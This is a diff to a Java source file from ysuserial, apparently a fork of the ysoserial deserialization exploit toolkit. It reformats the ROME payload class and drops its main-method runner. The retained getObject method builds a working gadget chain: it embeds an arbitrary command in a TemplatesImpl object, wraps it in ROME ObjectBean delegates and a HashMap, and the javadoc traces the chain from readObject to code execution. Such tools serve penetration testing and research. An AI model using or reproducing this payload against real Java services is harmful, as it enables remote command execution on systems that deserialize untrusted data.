@@ -8,10 +8,8 @@ import com.sun.syndication.feed.impl.ObjectBean;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
 import org.su18.ysuserial.payloads.util.Gadgets;
-import org.su18.ysuserial.payloads.util.PayloadRunner;
 
 /**
- *
  * TemplatesImpl.getOutputProperties()
  * NativeMethodAccessorImpl.invoke0(Method, Object, Object[])
  * NativeMethodAccessorImpl.invoke(Object, Object[])
@@ -26,22 +24,15 @@ import org.su18.ysuserial.payloads.util.PayloadRunner;
  * HashMap<K,V>.readObject(ObjectInputStream)
  *
  * @author mbechler
- *
  */
 @Dependencies("rome:rome:1.0")
-@Authors({ Authors.MBECHLER })
+@Authors({Authors.MBECHLER})
 public class ROME implements ObjectPayload<Object> {
 
-    public Object getObject ( String command ) throws Exception {
-        Object o = Gadgets.createTemplatesImpl(command);
-        ObjectBean delegate = new ObjectBean(Templates.class, o);
-        ObjectBean root  = new ObjectBean(ObjectBean.class, delegate);
-        return Gadgets.makeMap(root, root);
-    }
-
-
-    public static void main ( final String[] args ) throws Exception {
-        PayloadRunner.run(ROME.class, args);
-    }
-
+	public Object getObject(String command) throws Exception {
+		Object     o        = Gadgets.createTemplatesImpl(command);
+		ObjectBean delegate = new ObjectBean(Templates.class, o);
+		ObjectBean root     = new ObjectBean(ObjectBean.class, delegate);
+		return Gadgets.makeMap(root, root);
+	}
 }
